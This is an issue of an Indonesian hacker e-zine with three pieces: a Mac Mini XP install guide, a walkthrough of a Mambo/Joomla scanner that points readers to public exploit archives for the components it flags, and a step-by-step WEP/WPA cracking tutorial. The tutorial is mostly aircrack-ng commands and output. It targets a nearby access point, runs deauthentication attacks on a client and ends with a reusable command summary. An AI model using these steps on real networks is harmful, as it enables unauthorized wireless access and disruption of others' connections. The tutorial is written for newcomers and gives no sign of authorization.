@@ -1,0 +1,435 @@
+             __                                            
+            /\ \                      __                   
+   __    ___\ \ \___     ___   ____  /\_\    ___      __   
+ /'__`\ /'___\ \  _ `\  / __`\/\_ ,`\\/\ \ /' _ `\  /'__`\ 
+/\  __//\ \__/\ \ \ \ \/\ \L\ \/_/  /_\ \ \/\ \/\ \/\  __/ 
+\ \____\ \____\\ \_\ \_\ \____/ /\____\\ \_\ \_\ \_\ \____\
+ \/____/\/____/ \/_/\/_/\/___/  \/____/ \/_/\/_/\/_/\/____/
+                                                           
+                                                           
+                    
+[ echo|zine, volume 6 issue 18 ]            
+                                 
+ 	Hacker LogBook
+Brought To You By: Various Artist!
+
+]===============[[ 6 langkah mudah menginstall XP di MAC (Mini) ]]===============[  
+
+Brought To You By : sakitjiwa
+                    arif/at/1stlink/mobi
+
+= 6 langkah]
+
+ 1. Boot pake installer os x
+ 2. Masuk disk utility <-- disini kita melakukan partisi, 
+    1 active buat mbr ms-dos sisanya biarin jadi freespace, trus restart
+ 3. Tekan mouse 2 2 nya biar si installer os x keluar <-- soalnya di mac mini tidak terdapat eject :p
+ 4. Restart pake installer win xp
+ 5. Partisi yg tadi masih free space diaktifkan sebagai raw sewaktu menginstall xp
+ 6. Final instalasi + install driver
+
+ gampang kan :p
+
+= Catatan ]
+
+ 1. Penggunaan disk utility mac untuk membuat partisi os selain mac, maka semua partisi akan dibuat jadi mbr
+ 2. Apabila menggunakan partition magic, akan terbaca partition bad! :p
+ 3. Ubah freespace menjadi raw saat instalasi xp
+ 4. Extract mac driver untuk xp tinggal gunakan dvd ori leopard ke pc, dgn os windows, sizenya sekitar 400 MB
+
+= Penutup ] 
+Maaf jika ada kesalahan, dan untuk saran silahkan email
+
+= Thanks to ]
+ allah swt, dewi, and all of my friends
+
+
+
+
+
+
+]===============[[ Mambo & Joomla Scanner Review ]]===============[
+
+Brought To You By : msz 
+                    www/maddotblind/com
+
+= Materials ]
+
+ - Java	[ http://www.java.com/en/download/index.jsp ]
+ - Scanner [ http://www.maddotblind.com/v1/download/scanner/Mambo&Joomla_Scanner.rar ]
+   *webScanner was written by Jeremiah Sahlberg <jjds@users.sourceforge.net>
+ - Komputer&OS	[ Komputer sesuai kantong | Saya memakai windows xp sp2 ]
+		
+	Play's
+	[1] Install Java installer
+	[2] Extract Mambo&Joomla_Scanner.rar pada directori C:
+	[3] Masuk ke dalam command prompt [start -> run -> cmd]
+	[4] lets go [ini tutorial nya di command prompt -nya]
+
+||----------------------------------------------------------------------------
+  Microsoft Windows XP [Version 5.1.2600]
+  (C) Copyright 1985-2001 Microsoft Corp.
+
+  C:\>cd Mambo&Joomla_Scanner
+	
+  C:\Mambo&Joomla_Scanner>dir [melihat isi file scanner]
+	
+  Volume in drive C has no label.
+  Volume Serial Number is 8025-63F2
+
+  Directory of C:\Mambo_RFI_Scanner
+	02/04/2008  02:31 AM    <DIR>          .
+	02/04/2008  02:31 AM    <DIR>          ..
+	07/13/2003  11:37 PM                90 AUTHORS
+	12/29/2006  01:20 PM             3,150 checks.dat
+	07/13/2003  11:35 PM            18,353 COPYING
+	07/15/2003  03:31 PM               432 FAQ
+	03/14/2005  02:37 PM               336 INSTALL
+	07/15/2003  01:26 PM                22 LICENSE
+	08/17/2004  09:15 PM               543 README
+	03/14/2005  02:51 PM             3,743 WebScanner.class
+  	03/14/2005  02:51 PM             6,819 WebScanner.java
+					10 File(s)         33,488 bytes
+					2 Dir(s)  18,434,498,560 bytes free
+				
+  C:\Mambo&Joomla_Scanner>java WebScanner -h [host url Ex:localhost]
+  http://localhost/index.php - 200
+  http://localhost/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= - 200
+	Total 200: 1
+	Total 401: 0
+	Total 403: 0
+	Total 404: 45
+	Total 500: 0
+	Total Other: 0
+||-------------------------------------------------------------------------------
+	
+  Ket:  Total 200: 1   [ Total Url aktif bisa diexploit ]
+	Total 401: 0   [ Total Url tidak diketemukan ]
+	Total 403: 0   [ Total Url Forbiden ]
+	Total 404: 45  [ Total dari scanner ]
+	Total 500: 0   [ Tidak penting ]
+	Total Other: 0 [ Tidak penting ]
+
+		
+        Mudah bukan....!!!!|
+	Kalau sudah dapat Url yang bisa di exploit buka browser baru arahkan ke Milw0rm.com
+	Search "Componentnya Ex:com_serverstat" lihat hasilnya bisa RFI, SQL Injection, dsb.
+		
+= Kelebihan dari scanner ini ]
+ - Mempermudah dalam mencoba berbagai exploit dari CMS Mambo & Joomla.
+ - Berguna bagi yang menggunakan Mambo / Joomla untuk lebih secure websitenya.
+ - Tidak memakan resouce disk yang besar seperti nikto [http://www.cirt.com].
+ - Tidak berlicense seperti [ GPL [ Ga Pake License] 
+	
+= Kekurangan dari scanner ini ]
+ - Harus melakukan update manual di file "checks.dat" gunakan text editor [notepad, notepadd++, etc]
+   [ Ambil dari milw0rm / echo.or.id [Artikel bug].
+ - Hasil scanning tidak memastikan bahwa component/module sudah di patch / belum [ Kurang tepat ].
+ - Bisa dirasakan sendiri. [Kelebihan hanya milik yang kuasa, Kekurangan milik kita [kata Bnd.Dorce].
+	
+= Penutup ]
+ - Jadikanlah ini sebagai pengetahuan & Lebih secure untuk kita.
+ - Don't destroy people website. But,Try to remind to administrator.
+ - ujung tinggi Etika Hacker 
+	
+= Greetz ]
+ - echo.or.id & staff [ y3dips & friend ] [ we thank you for effusing which you give ].
+ - jasakom [ staff and st"o ] thz your book because becoming my ispirasi .
+ - Lirva32 [ joomla is good ].
+ - Yogyafree [ X-Code ] .
+ - Security IT indonesia.
+ - My Hosting [ Sory Sory i'm newbie ] .
+ - My Friend [The_bego[[Araze from ITB]I await you here.],Schoolmate[I long to come in contactwith all of you.],
+   kEny0t, k-Vio and Wife, 9oNdRonK, b4nD0tz, n0rM4n[let learn diligent].\
+   [ Let barge ahead for the progress of nation ] .
+ - My old friend [ The_Bego[ Araze ] [I await you here to learn to with us.]]
+ - and  For all which I recognize and also I [do] not recognize.
+
+
+
+
+
+
+
+]===============[[ WEP/WPA_Cracking_with_Backtrack_2.0 ]]===============[
+
+Brought To You By : hyp3rl1nk
+                    hyperlink87/at/yahoo/com
+
+= Pengantar ]
+
+	Berawal dari keingintahuan saya tentang Wireless Hacking saya membeli 
+buku berjudul Wireless Kung Fu yang ditulis oleh S'to. Tanpa bermaksud menjeplak
+apa yang tertulis disana, saya akan berbagi sedikit pengetahuan berdasarkan
+buku tersebut dengan gaya bahasa saya sendiri. Apabila anda adalah salah satu
+insan yang merasa mahalnya buku-buku hacking tersebut, anda dapat membaca
+e-zine ini yang gratis meskipun dengan segala keterbatasannya.Semoga dapat
+membantu Newbie yang ingin mencoba WEP/WPA Cracking.
+
+
+= Persiapan ]
+
+Adapun persiapan yang kita butuhkan untuk melakukan wireless hacking adalah :
+
+1. Sebuah Wireless Adapter yang mendukung mode monitoring & packet injection
+
+Beberapa produk yang ada di Indonesia yang mendukung monitoring mode &
+packet injection adalah :
+
+a.3Com 3CRPAG175B
+b.3Com 3CRXJK10075
+c.DLINK DWL-G630 Rev C
+d.Linksys WPC55AG
+e.TrendNET TEW-441PC
+f.TrendNET TEW-443PI
+g.TP-LINK TL-WN610G
+
+Adapter tersebut diatas memiliki chip atheros yang mendukung mode monitoring
+dan packet injection.
+
+Link yang dapat anda kunjungi untuk masalah adapter ini adalah sbb:
+
+http://www.aircrack-ng.org/doku.php?id=compatibility_drivers&DokuWiki=27a61cee33fbcd3f4653a3526ee30eb4
+http://backtrack.offensive-security.com/index.php?title=HCL:Wireless
+
+Apa itu monitoring mode ?
+
+http://en.wikipedia.org/wiki/Monitor_mode :
+
+"Monitor mode, or RFMON mode, allows a computer with a wireless network
+interface card (NIC) to monitor all traffic received from the wireless network"
+
+Dalam bahasa awam berarti monitoring mode memungkinkan kita menyadap data pada
+jaringan wireless. Dengan monitoring mode ini pula kita dimungkinkan untuk
+mengumpulkan data yang dibutuhkan dalam proses WEP cracking.
+
+Lalu apa yang dimaksud dengan packet Injection ?
+
+"Packet injection is a computer networking term which refers to sending a packet
+on a network into an already established connection. This is accomplished by
+crafting a packet using raw sockets"
+
+Dalam bahasa mudahnya injeksi paket merupakan sebuah upaya mengirimkan paket pada
+network yang sudah terkoneksi.
+
+Adapun manfaat injeksi paket ini adalah untuk mempercepat proses WEP cracking.
+
+Apabila anda tertarik mengetahui secara mendalam cara kerja WEP cracking anda
+dapat melakukan googling atau membeli buku yang membahas khusus tentang hal
+tersebut.
+
+2. Sebuah Laptop
+Tentunya anda membutuhkan sebuah laptop agar dapat melakukan wireless hacking ini
+kecuali anda ingin menenteng2 sebuah Pc ke area wireless :)
+
+3. CD Linux Backtrack 2.0
+Dapat anda download melalui situs : http://www.remote-exploit.org/backtrack_download.html
+
+= Proof Of Concept ]
+
+Hardware dan Software yang saya gunakan kali ini adalah :
+
+Notebook Dell Latitude C640
+Wireless Adapter TP-LINK TL-WN610G
+CD Backtrack 2.0
+
+Langkah pertama yang akan kita lakukan adalah melakukan :
+
+== Booting dengan CD Backtrack 2.0 ]
+
+Apabila anda mengalami masalah pada saat booting seperti saya,
+kemungkinan disebabkan oleh setting default dma mode pada Backtrack yang
+tidak kompatibel dengan Cdrom milik anda.
+
+cara mengatasinya :
+Saat Booting awal ketik command :
+
+bt debug
+
+Saat keluar prompt untuk mengetikkan perintah, saatnya mengetikkan :
+
+mkdir /mnt/cdrom
+hdparm -d0 /dev/hdc
+mount /dev/hdc /mnt/cdrom
+
+Lalu pencet kombinasi tombol ctrl-D sampai anda mendapatkan login prompt.
+
+== WEP Cracking ]
+
+  Setelah berhasil login dan masuk ke window manager, bukalah terminal dan
+ketikkan perintah berikut :
+
+ airmon-ng stop ath0
+
+ airmon-ng start wifi0
+
+kedua perintah ini adalah Untuk mengaktifkan mode monitoring dan packet
+injection pada wireless adapter anda.
+
+Lanjutkan dengan mengetikkan perintah :
+
+ airodump-ng ath0
+
+Perintah ini akan menampilkan kondisi jaringan wireless pada area anda.
+cthnya seperti berikut :
+
+CH 9 ][ Elapsed: 1 Min ][ 2007-11-23 16:50
+
+BSSID              Pwr  Beacons  #Data  #/s  CH  MB  ENC  CIPHER  AUTH  ESSID
+
+00:19:5B:5C:62:92    9       57      5    0   6  54  WEP  WEP           REK-1
+00:17:9A:C0:5D:3E    7       66     92    0   1  54  OPN                Hall_G
+00:15:E9:E1:34:CD    3       16      3    0   6  54  WEP  WEP           TokoPDA.com Plangi Lt II no 17C
+00:00:88:E6:00:75    3       13      0    0   1  54  OPN                PlangiHotspot-Gloria
+
+BSSID              STATION            PWR  Lost  Packets  Probes
+
+00:19:5B:5C:62:92  00:19:D2:45:D0:EB    9     0       10  REK-1
+00:15:E9:E1:34:CD  00:19:7D:F6:CF:79    8     0        5  TokoPDA.com Plangi Lt II no 17C
+
+Target kita kali ini adalah Access Point REK-1 dengan BSSID 00:19:5B:5C:62:92
+
+Disini kita juga dapat melihat bahwa AP REK-1 dengan BSSID 00:19:5B:5C:62:92 terkoneksi
+dengan Client (Station) 00:19:D2:45:D0:EB
+
+Selanjutkan buka terminal baru dan ketikkan perintah :
+
+ airodump-ng –channel 6 –bssid 00:19:5B:5C:62:92 -w hasil ath0
+
+Arti dari perintah ini adalah kita akan mengcapture data yang lewat pada Access Point
+REK-1 dengan BSSID 00:19:5B:5C:62:92 pada channel 6 dalam sebuah file bernama hasil.
+
+akan tampil hasil seperti berikut :
+
+CH 6 ][ Elapsed: 13 Min ][ 2007-11-23 17:04
+
+BSSID              Pwr  RXQ  Beacons  #Data  #/s  CH  MB  ENC  CIPHER  AUTH  ESSID
+
+00:19:5B:5C:62:92    9   44     3728   9684   27   6  54  WEP  WEP      OPN  REK-1
+
+BSSID              STATION            PWR  Lost  Packets  Probes
+
+00:19:5B:5C:62:92  00:19:D2:45:D0:EB    9     0   268016  REK-1
+
+
+Data yang berhasil dicapture terlihat pada kolom #Data , data inilah yang kita
+butuhkan untuk melakukan proses Crack WEP. Semakin banyak data yg tercapture
+semakin baik.
+
+Proses ini akan memakan waktu yang sangat lama, dan tergantung dari kondisi traffic
+dari jaringan, semakin sibuk jaringan semakin baik.
+
+Untuk mempercepat proses "datangnya" data yang kita butuhkan ini, kita perlu
+melakukan injeksi pada Wireless Adapter (client) yang terkoneksi dengan AP.Untuk itu
+kita perlu membuka terminal baru dan mengetikkan perintah :
+
+aireplay-ng –arpreplay -b 00:19:5B:5C:62:92 -h 00:19:D2:45:D0:EB ath0
+
+akan tampil hasil seperti berikut :
+
+The Interface MAC (00:14:78:74:F9:B2) doesn't match the specified MAC (-h)
+       ifconfig ath0 hw ether 00:19:d2:45:D0:EB
+Saving ARP request in replay_arp-1122-165041.cap
+You Should also start airodump-ng to capture replies.
+Read 348192 packets (got 13419 ARP request) sent 266534 packets..
+
+Untuk lebih mempercepat lagi proses "datangnya" data yang kita butuhkan, maka kita
+perlu memaksa client melakukan reconnect dengan AP (putus lalu sambung lagi) .
+Untuk itu buka terminal baru lagi dan ketikkan perintah berikut :
+
+aireplay-ng –deauth 5 -c 00:19:D2:45:D0:EB -a 00:19:5B:5C:62:92 ath0
+
+akan tampil hasil sebagai berikut :
+
+17:02:42  Sending DeAuth to station  --  STMAC:  [00:19:D2:45:D0:EB]
+17:02:44  Sending DeAuth to station  --  STMAC:  [00:19:D2:45:D0:EB]
+17:02:45  Sending DeAuth to station  --  STMAC:  [00:19:D2:45:D0:EB]
+17:02:46  Sending DeAuth to station  --  STMAC:  [00:19:D2:45:D0:EB]
+17:02:47  Sending DeAuth to station  --  STMAC:  [00:19:D2:45:D0:EB]
+
+Anda dapat melakukan perintah ini beberapa kali dengan jeda waktu tertentu :)
+
+Setelah mendapat #Data yang cukup banyak anda dapat membuka terminal baru sekali
+lagi dan melakukan proses WEP cracking dengan mengetikkan perintah :
+
+aircrack-ng hasil*.cap
+
+Atau bila menggunakan metode PTW cracking :
+
+aircrack-ptw hasil-01.cap
+
+*aircrack-ptw tidak dapat melakukan cracking beberapa file sekaligus sehingga anda
+harus mendefinisikan file yang ingin di cracking, pada kasus ini adalah hasil-01.cap
+
+Apabila anda berhasil melakukan cracking, maka anda akan melihat WEP keys tersebut.
+
+= WPA/WPA2 Cracking ]
+
+  Untuk WPA/WPA2 Cracking, perintah2 yang anda butuhkan adalah :
+
+airmon-ng stop ath0
+airmon-ng start wifi0
+airodump-ng ath0
+airodump-ng --channel [x] --bssid [x] -w hasil ath0
+aireplay-ng --deauth 2 -c [client MAC] -a [Ap MAC] ath0
+aircrack-ng -w password.lst hasil*cap
+
+Perbedaannya dengan WEP cracking anda tidak perlu menjalankan perintah :
+aireplay-ng --arpreplay -b [AP MAC] -h [Client MAc] ath0
+
+Selain itu proses Cracking WPA/WPA2 juga menggunakan metode yang berbeda dengan
+WEP Cracking yaitu dengan Dictionary Attack.
+
+password.lst merupakan kumpulan kosa kata seperti kamus yang digunakan satu persatu
+untuk melakukan cracking.
+
+= Command Summary ]
+
+  a.Deauth All Client
+  -------------------
+  aireplay-ng --deauth 10 -c FF:FF:FF:FF:FF:FF -a [AP MAC] ath0
+
+  b.WEP crack
+  -----------
+  airmon-ng stop ath0
+  airmon-ng start wifi0
+  airodump-ng ath0
+  airodump-ng --channel [x] --bssid [x] -w [hasil] ath0
+  aireplay-ng --arpreplay -b [AP MAC] -h [Client MAc] ath0
+  aireplay-ng --deauth 5 -c [Client MAC] -a [AP MAC] ath0
+
+  aircrack-ng hasil*.cap
+  /aircrack-ptw hasil-01.cap
+
+  c.WPA/WPA2 Crack
+  ----------------
+  airmon-ng stop ath0
+  airmon-ng start wifi0
+  airodump-ng ath0
+  airodump-ng --channel [x] --bssid [x] -w [hasil] ath0
+  aireplay-ng --deauth 2 -c [client MAC] -a [Ap MAC] ath0
+
+  aircrack-ng -w password.lst [hasil*cap]
+
+= Reference ]
+
+ - Buku Wireless Kungfu S'to terbitan Jasakom
+ - http://www.aircrack-ng.org/doku.php?id=newbie_guide
+ - http://en.wikipedia.org/wiki/Monitor_mode
+ - http://en.wikipedia.org/wiki/Packet_injection
+ - http://www.aircrack-ng.org/doku.php?id=compatibility_drivers&DokuWiki=27a61cee33fbcd3f4653a3526ee30eb4
+ - http://backtrack.offensive-security.com/index.php?title=HCL:Wireless
+
+
+= Greetz ]
+
+ - My LorD "Jesus Christ"
+ - Echo Staff
+ - Free Hotspot Kampus saya tercinta :)
+
+]===============[[ Hacker LogBook by Various Artist ]]===============[ 
+
+*- $e18dot010dottxt - echo|zine - issue#18 - 280308 -*
+
+
+
